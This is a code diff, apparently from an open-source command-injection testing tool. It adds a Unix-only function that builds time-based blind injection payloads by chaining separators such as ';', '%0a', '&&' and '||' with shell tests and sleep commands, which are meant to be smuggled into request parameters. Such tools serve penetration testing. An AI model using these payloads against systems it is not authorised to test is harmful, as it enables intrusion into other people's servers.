@@ -160,6 +160,38 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
   return checks.sanitize_payload_newlines(payload)
 
 """
+Build a raw shell numeric comparison for false-positive checks; Unix-only.
+"""
+def condition_check(separator, condition, timesec, http_request_method):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    return None
+  if separator in (";", "%0a"):
+    payload = (separator +
+              "if [ " + condition + " ]" + separator +
+              "then sleep " + str(timesec) + separator +
+              "fi"
+              )
+  elif separator == _urllib.parse.quote("&&"):
+    payload = (_urllib.parse.quote("&") +
+              "sleep 0" + separator +
+              "[ " + condition + " ]" + separator +
+              "sleep " + str(timesec)
+              )
+  elif separator == "||":
+    pipe = "|"
+    payload = (pipe +
+              "[ ! " + condition + " ]" + separator +
+              "sleep " + str(timesec)
+              )
+  else:
+    return None
+
+  if settings.CUSTOM_INJECTION_MARKER:
+    payload = payload + separator
+
+  return checks.sanitize_payload_newlines(payload)
+
+"""
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method, operator="-le"):
